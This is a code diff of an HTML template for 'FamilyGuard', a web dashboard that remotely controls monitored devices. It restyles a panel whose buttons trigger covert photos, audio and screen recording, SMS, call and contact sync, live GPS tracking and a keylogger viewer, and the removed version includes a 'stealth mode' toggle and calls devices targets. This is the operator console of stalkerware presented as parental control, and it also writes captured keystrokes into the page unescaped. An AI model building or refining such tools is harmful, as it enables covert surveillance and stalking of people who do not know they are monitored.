@@ -3,127 +3,349 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FamilyGuard | Centre de Contrôle</title>
+    <title>FamilyGuard | Control Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f1f5f9; margin: 0; display: flex; flex-direction: column; height: 100vh; }
-        header { background: #1e293b; padding: 20px; border-bottom: 2px solid #334155; text-align: center; }
-        .container { display: flex; flex: 1; overflow: hidden; }
-        .sidebar { width: 300px; background: #1e293b; border-right: 2px solid #334155; padding: 20px; overflow-y: auto; }
-        .main { flex: 1; padding: 40px; overflow-y: auto; }
-        .device-card { background: #334155; padding: 15px; border-radius: 8px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
-        .device-card:hover { background: #475569; }
-        .device-card.active { border-left: 5px solid #38bdf8; }
-        h2 { color: #38bdf8; }
-        .controls { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
-        button { background: #0284c7; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: #0369a1; transform: translateY(-2px); }
-        button.danger { background: #ef4444; }
-        button.danger:hover { background: #dc2626; }
-        .status-badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 0.8rem; background: #22c55e; }
-        .console { background: #000; color: #22c55e; padding: 20px; border-radius: 8px; font-family: monospace; height: 200px; overflow-y: auto; margin-top: 40px; }
+        :root {
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --bg-dark: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --accent: #22d3ee;
+            --danger: #ef4444;
+            --success: #22c55e;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #0f172a 100%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 280px;
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(10px);
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            height: 100vh;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 3rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .nav-item {
+            padding: 1rem;
+            border-radius: 12px;
+            color: var(--text-dim);
+            text-decoration: none;
+            margin-bottom: 0.5rem;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .nav-item:hover, .nav-item.active {
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--text-main);
+        }
+
+        .nav-item i { font-size: 1.2rem; }
+
+        /* Main Content */
+        .main-content {
+            margin-left: 280px;
+            flex: 1;
+            padding: 2rem;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .status-badge {
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            background: rgba(34, 197, 94, 0.1);
+            color: var(--success);
+            border: 1px solid rgba(34, 197, 94, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Grid Layout */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 1.5rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Map */
+        #map {
+            height: 350px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Action Buttons */
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .btn-action {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text-main);
+            padding: 1rem;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+
+        .btn-action:hover {
+            background: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .btn-action i {
+            display: block;
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+        }
+
+        /* Logs Section */
+        .logs-container {
+            height: 300px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 16px;
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+
+        .log-entry {
+            padding: 0.5rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: var(--text-dim);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .log-entry.new { color: var(--accent); }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Device Selector */
+        .device-selector {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            padding: 0.5rem;
+            border-radius: 8px;
+        }
     </style>
 </head>
 <body>
-    <header>
-        <h1>👨‍👩-👧 FamilyGuard Control Center</h1>
-    </header>
-    <div class="container">
-        <div class="sidebar">
-            <h2>Appareils Connectés</h2>
-            <div id="device-list">
-                {% if devices %}
-                    {% for device in devices %}
-                        <div class="device-card active" onclick="selectDevice('{{ device }}')">
-                            <strong>{{ device }}</strong><br>
-                            <span class="status-badge">En ligne</span>
-                        </div>
-                    {% endfor %}
-                {% else %}
-                    <p>Aucun appareil en ligne...</p>
-                {% endif %}
-            </div>
+    <div class="sidebar">
+        <div class="logo">
+            <i class="fas fa-shield-halved"></i> FamilyGuard
         </div>
-        <div class="main">
-            <h2 id="active-device-name">Sélectionnez un appareil</h2>
-            <div class="controls" id="control-panel" style="display: none;">
-                <button onclick="sendCommand('take_photo')">📸 Prendre Photo Stealth</button>
-                <button onclick="sendCommand('record_audio')">🎤 Enregistrer Audio (30s)</button>
-                <button onclick="sendCommand('sync_logs')">📜 Synchroniser SMS/Appels</button>
-                <button onclick="sendCommand('sync_contacts')">📇 Synchroniser Contacts</button>
-                <button onclick="sendCommand('sync_history')">🌐 Historique Navigation</button>
-                <button onclick="viewKeystrokes()">⌨️ Voir Frappes Clavier</button>
-                <button onclick="sendCommand('start_surveillance')">📹 Caméra Surveillance (60s)</button>
-                <button onclick="sendCommand('start_screen_record')">🖥️ Capture d'Écran (30s)</button>
-                <button onclick="sendCommand('enable_stealth')">👻 Activer Mode Furtif</button>
-                <button onclick="sendCommand('disable_stealth')">👁️ Désactiver Mode Furtif</button>
-                <button class="danger" onclick="sendCommand('emergency_alert')">🚨 Alerte Urgence</button>
+        <nav>
+            <a href="#" class="nav-item active"><i class="fas fa-chart-line"></i> Dashboard</a>
+            <a href="#" class="nav-item"><i class="fas fa-location-dot"></i> Localisation</a>
+            <a href="#" class="nav-item"><i class="fas fa-keyboard"></i> Keylogger</a>
+            <a href="#" class="nav-item"><i class="fas fa-camera"></i> Médias</a>
+            <a href="#" class="nav-item"><i class="fas fa-microphone"></i> Audio</a>
+            <a href="#" class="nav-item"><i class="fas fa-gear"></i> Paramètres</a>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <div>
+                <h1 style="font-size: 1.8rem;">Tableau de Bord</h1>
+                <p style="color: var(--text-dim);">Bienvenue sur votre centre de contrôle FamilyGuard.</p>
+            </div>
+            <div class="status-badge">
+                <span style="width: 8px; height: 8px; background: var(--success); border-radius: 50%; display: inline-block;"></span>
+                Système Opérationnel
+            </div>
+        </header>
+
+        <div class="dashboard-grid">
+            <!-- Map Card -->
+            <div class="card" style="grid-column: span 2;">
+                <div class="card-header">
+                    <div class="card-title"><i class="fas fa-map-location-dot"></i> Position en temps réel</div>
+                    <select class="device-selector" id="deviceSelect">
+                        {% for device in devices %}
+                        <option value="{{ device }}">{{ device }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                <div id="map"></div>
             </div>
 
-            <div class="console" id="console">
-                > Initialisation du système...<br>
-                > Prêt pour les commandes.<br>
+            <!-- Commands Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title"><i class="fas fa-bolt"></i> Actions Rapides</div>
+                </div>
+                <div class="action-grid">
+                    <button class="btn-action" onclick="sendCommand('take_photo')">
+                        <i class="fas fa-camera"></i> Photo Furtive
+                    </button>
+                    <button class="btn-action" onclick="sendCommand('record_audio')">
+                        <i class="fas fa-microphone"></i> Audio (30s)
+                    </button>
+                    <button class="btn-action" onclick="sendCommand('start_screen_record')">
+                        <i class="fas fa-video"></i> Capture Écran
+                    </button>
+                    <button class="btn-action" onclick="sendCommand('sync_logs')">
+                        <i class="fas fa-sync"></i> Sync Logs
+                    </button>
+                    <button class="btn-action" onclick="viewKeystrokes()" style="grid-column: span 2; border-color: var(--primary);">
+                        <i class="fas fa-keyboard" style="color: var(--primary);"></i> Voir Frappes Clavier
+                    </button>
+                </div>
+            </div>
+
+            <!-- Logs Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title"><i class="fas fa-terminal"></i> Activité Récente</div>
+                </div>
+                <div class="logs-container" id="logs">
+                    <div class="log-entry">En attente de connexion...</div>
+                </div>
             </div>
         </div>
     </div>
 
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        let currentDevice = null;
+        // Initialisation de la carte
+        var map = L.map('map').setView([48.8566, 2.3522], 13);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
 
-        function selectDevice(deviceId) {
-            currentDevice = deviceId;
-            document.getElementById('active-device-name').innerText = "Contrôle de : " + deviceId;
-            document.getElementById('control-panel').style.display = 'grid';
-            logConsole("Cible sélectionnée : " + deviceId);
-        }
+        var marker = L.marker([48.8566, 2.3522]).addTo(map);
 
-        async function sendCommand(action) {
-            if (!currentDevice) return;
+        // WebSocket Management
+        const deviceId = document.getElementById('deviceSelect').value;
+        const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
+        const ws = new WebSocket(`${protocol}://${location.host}/ws/${deviceId}`);
+
+        ws.onmessage = function(event) {
+            const data = JSON.parse(event.data);
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry new';
             
-            logConsole("Envoi de la commande : " + action + "...");
-            
-            const formData = new FormData();
-            formData.append('device_id', currentDevice);
-            formData.append('action', action);
-            formData.append('duration', 30);
-
-            try {
-                const response = await fetch('/admin/command', {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                logConsole("Réponse serveur : " + JSON.stringify(result));
-            } catch (error) {
-                logConsole("ERREUR : " + error.message);
+            if (data.type === 'child_position') {
+                marker.setLatLng([data.lat, data.lng]);
+                map.panTo([data.lat, data.lng]);
+                entry.innerHTML = `<span style="color:var(--success)">[GPS]</span> Nouvelle position : ${data.lat}, ${data.lng}`;
+            } else {
+                entry.textContent = `[EVENT] ${JSON.stringify(data)}`;
             }
+            
+            logs.prepend(entry);
+        };
+
+        function sendCommand(action) {
+            const deviceId = document.getElementById('deviceSelect').value;
+            const formData = new FormData();
+            formData.append('device_id', deviceId);
+            formData.append('action', action);
+            
+            fetch('/admin/command', {
+                method: 'POST',
+                body: formData
+            }).then(r => r.json()).then(data => {
+                const logs = document.getElementById('logs');
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.textContent = `[CMD] Commande ${action} envoyée.`;
+                logs.prepend(entry);
+            });
         }
 
         async function viewKeystrokes() {
-            if (!currentDevice) return;
-            logConsole("Récupération des frappes clavier...");
+            const deviceId = document.getElementById('deviceSelect').value;
+            const res = await fetch(`/admin/keystrokes/${deviceId}`);
+            const result = await res.json();
             
-            try {
-                const response = await fetch(`/admin/keystrokes/${currentDevice}`);
-                const result = await response.json();
-                
-                if (result.status === "success" && result.data.length > 0) {
-                    logConsole("--- DERNIÈRES FRAPPES ---");
-                    result.data.forEach(file => {
-                        logConsole(file.content);
-                    });
-                    logConsole("-------------------------");
-                } else {
-                    logConsole("Aucun log clavier trouvé pour cet appareil.");
-                }
-            } catch (error) {
-                logConsole("ERREUR : " + error.message);
+            if (result.status === 'success') {
+                const logs = document.getElementById('logs');
+                result.data.forEach(session => {
+                    const entry = document.createElement('div');
+                    entry.className = 'log-entry';
+                    entry.style.color = '#fff';
+                    entry.innerHTML = `<i class="fas fa-keyboard"></i> <strong>${session.content}</strong>`;
+                    logs.prepend(entry);
+                });
             }
-        }
-
-        function logConsole(msg) {
-            const consoleDiv = document.getElementById('console');
-            consoleDiv.innerHTML += "> " + msg + "<br>";
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
     </script>
 </body>
